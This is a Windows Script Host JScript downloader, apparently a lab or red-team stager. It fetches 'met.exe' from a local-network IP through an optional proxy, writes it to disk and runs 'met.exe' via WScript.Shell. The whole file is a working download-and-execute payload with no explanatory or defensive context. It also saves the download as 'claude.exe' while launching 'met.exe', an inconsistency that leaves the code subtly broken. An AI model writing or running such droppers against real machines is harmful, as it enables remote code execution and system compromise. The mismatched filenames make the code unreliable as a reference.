var url = "http://192.168.251.151/met.exe";
var proxyServer = "http://your-proxy-server:8080"; // Can be empty, null, or "host:port"
var proxyBypass = "localhost";

var Object = WScript.CreateObject('MSXML2.ServerXMLHTTP');

// Apply proxy only if non-empty, otherwise use direct connection
if (proxyServer && proxyServer.trim() !== "") {
    // SXH_PROXY_SET_PROXY = 2 (manual proxy)
    Object.SetProxy(2, proxyServer.trim(), proxyBypass);
    // Uncomment if proxy requires authentication
    // Object.SetProxyCredentials("username", "password");
} else {
    // SXH_PROXY_SET_DIRECT = 1 (bypass proxy, connect directly)
    Object.SetProxy(1);
}

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("claude.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
